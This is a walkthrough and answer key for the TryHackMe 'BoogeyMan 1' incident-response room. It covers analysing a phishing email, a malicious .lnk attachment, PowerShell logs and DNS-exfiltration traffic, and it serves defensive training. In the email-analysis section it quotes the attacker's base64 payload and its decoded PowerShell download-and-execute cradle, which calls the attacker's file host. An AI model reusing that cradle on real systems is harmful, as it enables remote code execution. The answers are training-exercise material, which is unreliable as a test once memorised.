# BoogeyMan 1 - TryHackMe

> Analyze phishing email, endpoint logs, and network traffic to track threat actor

**Room Link:** https://tryhackme.com/room/boogeyman1

<img width="1567" height="924" alt="image" src="https://github.com/user-attachments/assets/4a479741-e7e6-40a7-930e-a03c99994010" />

---

## Task 1: Introduction

**Scenario:** Boogeyman threat group targets logistics sector

**Victim:** Julianne (finance employee at Quick Logistics LLC)

**Artifacts:**
- dump.eml (phishing email)
- powershell.json (PowerShell logs)
- capture.pcapng (network traffic)

**Location:** /home/ubuntu/Desktop/artefacts

**Tools available:**
- Thunderbird
- LNKParse3
- Wireshark
- tshark
- jq

**No answer needed**

---

## Task 2: Email Analysis

### Investigation

Open dump.eml in Thunderbird.

**View headers:** View > Message Source

### Questions

**Q1: Email address used to send phishing email?**

Use Message Header Analyzer (mha.azurewebsites.net).

Check From field.

- Answer: `agriffin@bpakcaging.xyz`

---

**Q2: Email address of victim?**

Check To field in headers.

- Answer: `julianne.westcott@hotmail.com`

---

**Q3: Third-party mail relay service based on DKIM-Signature?**

Check DKIM-Signature and List-Unsubscribe headers.

- Answer: `elasticemail`

---

**Q4: Name of file inside encrypted attachment?**

Save Invoice.zip and extract with password.

- Answer: `Invoice_20230103.lnk`

---

**Q5: Password of encrypted attachment?**

Check email body.

- Answer: `Invoice2023!`

---

**Q6: Encoded payload in Command Line Arguments?**

**Command:**
```bash
lnkparse Invoice_20230103.lnk
```

Look for Command line arguments section.

**Decoded payload (CyberChef - From Base64):**
```powershell
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
```

- Answer: `aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==`

---

## Task 3: Endpoint Security

### PowerShell Log Analysis

**Query for domains:**
```bash
cat powershell.json | jq '{EventID, ScriptBlockText}' | grep bpakcaging.xyz
```

### Questions

**Q1: Domains used by attacker? (alphabetical order)**

File hosting: files.bpakcaging.xyz

C2: cdn.bpakcaging.xyz

- Answer: `cdn.bpakcaging.xyz,files.bpakcaging.xyz`

---

**Q2: Name of enumeration tool downloaded?**

**Query:**
```bash
cat powershell.json | jq '{EventID, ScriptBlockText}' | grep -i seatbelt
```

- Answer: `seatbelt`

---

**Q3: File accessed using sq3.exe? (escaped backslashes)**

**Query:**
```bash
cat powershell.json | jq '{EventID, ScriptBlockText}' | grep sq3.exe
```

Find username:
```bash
cat powershell.json | jq '{EventID, ScriptBlockText}' | grep Users
```

- Answer: `C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite`

---

**Q4: Software that uses file in Q3?**

Check file path for application name.

- Answer: `Microsoft Sticky Notes`

---

**Q5: Name of exfiltrated file?**

**Query with timestamp sort:**
```bash
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]' | jq '{EventID, ScriptBlockText}' | less
```

Look for file operations.

- Answer: `protected_data.kdbx`

---

**Q6: File type using .kdbx extension?**

Google the extension.

- Answer: `KeePass`

---

**Q7: Encoding used during exfiltration?**

Check PowerShell events for encoding variable.

File read as binary, converted to hex.

- Answer: `hex`

---

**Q8: Tool used for exfiltration?**

Check later PowerShell events.

- Answer: `nslookup`

---

## Task 4: Network Traffic Analysis

### Wireshark Analysis

**Q1: Software used to host file/payload server?**

**Filter:** HTTP requests to files.bpakcaging.xyz

Check Server header in HTTP responses.

- Answer: `Python`

---

**Q2: HTTP method for C2 command output?**

**Filter:** HTTP requests with cdn.bpakcaging.xyz

Check User-Agent: PowerShell

Method used for output.

- Answer: `POST`

---

**Q3: Protocol used during exfiltration?**

Attacker used nslookup tool.

**Filter:** DNS queries with bpakcaging.xyz

- Answer: `DNS`

---

**Q4: Password of exfiltrated file?**

**Filter:** HTTP traffic for sq3.exe

Follow TCP stream with SQL query to plum.sqlite.

Next stream shows POST response with data.

**CyberChef:** Magic operation → From Decimal

- Answer: `%p9^3!lL^Mz47E2GaT^y`

---

**Q5: Credit card number in exfiltrated file?**

**Extract DNS exfiltration data:**
```bash
tshark -r capture.pcapng -Y dns -T fields -e dns.qry.name | grep bpakcaging.xyz | cut -f1 -d '.' | grep -v -e "cdn" -e "files" | uniq | tr -d '\n' > extracted_file
```

**CyberChef:** From Hex

Save as .kdbx file.

Open in KeePass with password from Q4.

- Answer: `4024007128269551`

---

## Quick Reference

### Attack Flow

```
Phishing Email
    ↓
Malicious .lnk attachment
    ↓
PowerShell downloads payload
    ↓
Seatbelt enumeration
    ↓
Access Sticky Notes database
    ↓
Find KeePass password
    ↓
Exfiltrate protected_data.kdbx
    ↓
DNS exfiltration
```

### Email Analysis Tools

**Thunderbird:** Email client

**Message Header Analyzer:** Parse headers

**LNKParse3:** Analyze .lnk files

### PowerShell Log Analysis

**Basic jq query:**
```bash
cat powershell.json | jq '{EventID, ScriptBlockText}'
```

**With grep:**
```bash
cat powershell.json | jq '{EventID, ScriptBlockText}' | grep keyword
```

**Sort by timestamp:**
```bash
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]' | jq '{EventID, ScriptBlockText}' | less
```

### Wireshark Filters

**HTTP to domain:**
```
http.host == "domain.com"
```

**DNS queries:**
```
dns.qry.name contains "domain"
```

**TCP stream:**
Follow > TCP Stream

### tshark Extraction

**DNS queries:**
```bash
tshark -r file.pcapng -Y dns -T fields -e dns.qry.name
```

**Filter and parse:**
```bash
| grep domain | cut -f1 -d '.' | uniq
```

### Key Artifacts

**Email:**
- Sender: agriffin@bpakcaging.xyz
- Victim: julianne.westcott@hotmail.com
- Relay: elasticemail
- Attachment: Invoice.zip → Invoice_20230103.lnk

**Domains:**
- Files: files.bpakcaging.xyz
- C2: cdn.bpakcaging.xyz

**Tools:**
- Seatbelt (enumeration)
- sq3.exe (SQLite access)
- nslookup (exfiltration)

**Exfiltrated:**
- File: protected_data.kdbx
- Password: %p9^3!lL^Mz47E2GaT^y
- Contains: Credit card 4024007128269551

### Techniques Used

**Initial Access:**
- Phishing email
- Malicious .lnk file
- Base64 encoded PowerShell

**Discovery:**
- Seatbelt enumeration
- Sticky Notes database access
- Password hunting

**Collection:**
- KeePass database
- Credit card information

**Exfiltration:**
- DNS tunneling
- Hex encoding
- nslookup queries

### Detection Points

**Email:**
- Typosquatting domain (bpakcaging vs bpackaging)
- Third-party relay service
- Password-protected attachment

**Endpoint:**
- .lnk file execution
- PowerShell download commands
- SQLite database access
- Suspicious file operations

**Network:**
- Python HTTP server
- POST requests to C2
- DNS queries with data
- Subdomain exfiltration

---

## Key Takeaways

- **Phishing** initial access vector
- **.lnk files** execute PowerShell
- **Base64** common obfuscation
- **lnkparse** analyzes shortcuts
- **jq** parses JSON logs
- **Seatbelt** enumeration tool
- **Sticky Notes** stores passwords
- **KeePass** password database
- **DNS exfiltration** via subdomains
- **nslookup** abused for data transfer
- **Hex encoding** for binary data
- **tshark** extracts network data
- **Multi-stage** attack progression

Happy hunting
